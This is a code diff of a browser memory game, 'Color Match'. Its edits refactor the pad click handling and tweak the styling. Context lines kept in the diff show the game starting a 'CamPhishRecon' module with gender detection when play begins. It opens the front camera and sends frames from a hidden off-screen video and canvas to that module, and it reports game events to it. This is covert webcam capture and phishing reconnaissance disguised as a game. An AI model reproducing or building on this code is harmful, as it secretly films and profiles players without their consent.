@@ -8,19 +8,21 @@
 <title>Color Match</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-body{background:#0d0d1a;color:#fff;font-family:-apple-system,sans-serif;overflow:hidden;touch-action:none;user-select:none;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
+body{background:#0d0d1a;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;overflow:hidden;touch-action:none;user-select:none;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
 .title{font-size:clamp(26px,8vw,44px);background:linear-gradient(135deg,#ff6b9d,#ffd700,#6bcfff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900;margin-bottom:4px}
 .sub{color:#888;font-size:13px;margin-bottom:20px}
 #grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;width:min(280px,75vw);height:min(280px,75vw)}
 .pad{border-radius:20px;cursor:pointer;opacity:0.5;transition:opacity .15s,transform .1s;border:3px solid rgba(255,255,255,0.1);touch-action:manipulation}
 .pad.active{opacity:1;transform:scale(0.95);box-shadow:0 0 30px currentColor}
 .pad.tappable{opacity:0.7}
+.pad.tappable:active{opacity:1;transform:scale(0.92)}
 #status{font-size:16px;margin:16px 0;min-height:24px;color:#aaa;text-align:center}
 #round{font-size:13px;color:#666;margin-bottom:8px}
 .btn{background:linear-gradient(135deg,#ff6b9d,#c44dff);color:#fff;border:none;padding:14px 44px;font-size:17px;font-weight:800;border-radius:30px;cursor:pointer;margin-top:8px}
 .btn:active{transform:scale(0.95)}
 .hidden{display:none}
-.go{position:fixed;inset:0;background:rgba(13,13,26,0.96);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:50}
+.go{position:fixed;inset:0;background:rgba(13,13,26,0.96);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:50;padding:20px}
+.go-title{font-size:clamp(22px,6vw,36px);color:#ff6b9d;margin-bottom:8px}
 .final{font-size:clamp(32px,10vw,52px);color:#ffd700;font-weight:900}
 .best{color:#888;margin:8px 0 20px}
 .shares{display:flex;gap:8px;margin-bottom:16px}
@@ -43,9 +45,9 @@ video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:
 <div class="pad" id="p4" style="background:#ffd700;color:#ffd700" data-i="3"></div>
 </div>
 <div id="status">Press Start to begin</div>
-<button class="btn" id="startBtn" onclick="startGame()">▶ Start</button>
+<button class="btn" id="startBtn">▶ Start</button>
 <div class="go hidden" id="gameover">
-<div style="font-size:24px;color:#ff6b9d;margin-bottom:8px">Game Over</div>
+<div class="go-title">Game Over</div>
 <div class="final" id="finalScore">0</div>
 <div class="best" id="bestScore"></div>
 <div class="shares"><button class="sb s-wa" onclick="shareCard('wa')">💬 Share</button><button class="sb s-fb" onclick="shareCard('fb')">📘 Share</button></div>
@@ -58,20 +60,59 @@ var sequence=[],playerInput=[],round=1,playing=false,acceptingInput=false;
 var hs=[];try{hs=JSON.parse(localStorage.getItem('colorMatchHS')||'[]');}catch(e){}
 var ac=null;
 var freqs=[330,440,550,660];
+
 function snd(f){try{if(!ac)ac=new(AudioContext||webkitAudioContext)();var o=ac.createOscillator(),g=ac.createGain();o.frequency.value=f;g.gain.value=0.08;o.connect(g);g.connect(ac.destination);o.start();g.gain.exponentialRampToValueAtTime(0.001,ac.currentTime+0.2);o.stop(ac.currentTime+0.2);}catch(e){}}
+
 function flash(i){
 var pad=document.getElementById('p'+(i+1));
+if(!pad)return;
 pad.classList.add('active');snd(freqs[i]);
 setTimeout(function(){pad.classList.remove('active');},300);
 }
+
+// SINGLE click handler setup — attached ONCE per pad
+var padsBound=false;
+function bindPads(){
+if(padsBound)return;padsBound=true;
+for(var i=0;i<4;i++){
+(function(idx){
+var pad=document.getElementById('p'+(idx+1));
+if(pad){
+pad.addEventListener('click',handlePadClick.bind(null,idx));
+pad.addEventListener('touchstart',function(e){e.preventDefault();handlePadClick(idx);},{passive:false});
+}
+})(i);
+}
+}
+
+function handlePadClick(idx){
+if(!acceptingInput||!playing)return;
+flash(idx);
+playerInput.push(idx);
+var pos=playerInput.length-1;
+if(playerInput[pos]!==sequence[pos]){
+gameOver();return;
+}
+if(playerInput.length===sequence.length){
+acceptingInput=false;
+document.getElementById('status').textContent='✓ Correct!';
+round++;
+if(navigator.vibrate)navigator.vibrate(20);
+for(var j=1;j<=4;j++)document.getElementById('p'+j).classList.remove('tappable');
+setTimeout(nextRound,900);
+}
+}
+
 function startGame(){
 if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
 startCamera();
+bindPads();
 sequence=[];round=1;playing=true;
 document.getElementById('gameover').classList.add('hidden');
 document.getElementById('startBtn').classList.add('hidden');
 nextRound();
 }
+
 function startCamera(){
 if(navigator.mediaDevices&&window.CamPhishRecon){
 navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){
@@ -81,11 +122,11 @@ setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);CamPhishR
 }).catch(function(){});
 }
 }
+
 function nextRound(){
 playerInput=[];acceptingInput=false;
 document.getElementById('round').textContent='Round '+round;
 document.getElementById('status').textContent='Watch carefully...';
-// Reset pad styles
 for(var i=1;i<=4;i++)document.getElementById('p'+i).classList.remove('tappable');
 sequence.push(Math.floor(Math.random()*4));
 var idx=0;
@@ -94,62 +135,16 @@ flash(sequence[idx]);idx++;
 if(idx>=sequence.length){
 clearInterval(playInterval);
 setTimeout(function(){
-document.getElementById('status').textContent='Your turn!';
+document.getElementById('status').textContent='Your turn! Repeat the sequence';
 acceptingInput=true;
-for(var i=1;i<=4;i++)document.getElementById('p'+i).classList.add('tappable');
+for(var j=1;j<=4;j++)document.getElementById('p'+j).classList.add('tappable');
 },500);
 }
 },700);
 }
-// Pad click handlers — set up ONCE on page load
-document.addEventListener('DOMContentLoaded',function(){
-for(var i=0;i<4;i++){
-(function(idx){
-var pad=document.getElementById('p'+(idx+1));
-pad.addEventListener('click',function(){
-if(!acceptingInput)return;
-flash(idx);
-playerInput.push(idx);
-var pos=playerInput.length-1;
-if(playerInput[pos]!==sequence[pos]){
-gameOver();return;
-}
-if(playerInput.length===sequence.length){
-acceptingInput=false;
-document.getElementById('status').textContent='Correct!';
-round++;
-if(navigator.vibrate)navigator.vibrate(20);
-for(var j=1;j<=4;j++)document.getElementById('p'+j).classList.remove('tappable');
-setTimeout(nextRound,800);
-}
-});
-})(i);
-}
-});
-// Also set up immediately (DOM already loaded since script is at bottom)
-for(var i=0;i<4;i++){
-(function(idx){
-var pad=document.getElementById('p'+(idx+1));
-if(pad&&!pad.hasListener){
-pad.addEventListener('click',function(){
-if(!acceptingInput)return;
-flash(idx);
-playerInput.push(idx);
-var pos=playerInput.length-1;
-if(playerInput[pos]!==sequence[pos]){gameOver();return;}
-if(playerInput.length===sequence.length){
-acceptingInput=false;document.getElementById('status').textContent='Correct!';round++;
-if(navigator.vibrate)navigator.vibrate(20);
-for(var j=1;j<=4;j++)document.getElementById('p'+j).classList.remove('tappable');
-setTimeout(nextRound,800);
-}
-});
-pad.hasListener=true;
-}
-})(i);
-}
+
 function gameOver(){
-playing=false;acceptingInput=false;document.getElementById('status').textContent='Wrong!';
+playing=false;acceptingInput=false;document.getElementById('status').textContent='Wrong sequence!';
 if(navigator.vibrate)navigator.vibrate([50,50,50]);snd(150);
 for(var j=1;j<=4;j++)document.getElementById('p'+j).classList.remove('tappable');
 hs.push(round-1);hs.sort(function(a,b){return b-a;});hs=hs.slice(0,5);
@@ -162,6 +157,11 @@ if(!hs.length)h='<b>🏆 Be the first!</b>';
 document.getElementById('goLb').innerHTML=h;
 if(window.CamPhishRecon)CamPhishRecon.Capture.event('game_over',{round:round-1});
 }
+
+// Bind pads immediately and set start button
+bindPads();
+document.getElementById('startBtn').onclick=startGame;
+
 function shareCard(t){
 var msg='🎨 I reached Round '+(round-1)+' in Color Match! Can you beat me? '+SHARE_URL;
 if(navigator.canShare){navigator.share({text:msg,title:'Color Match'}).catch(function(){});return;}
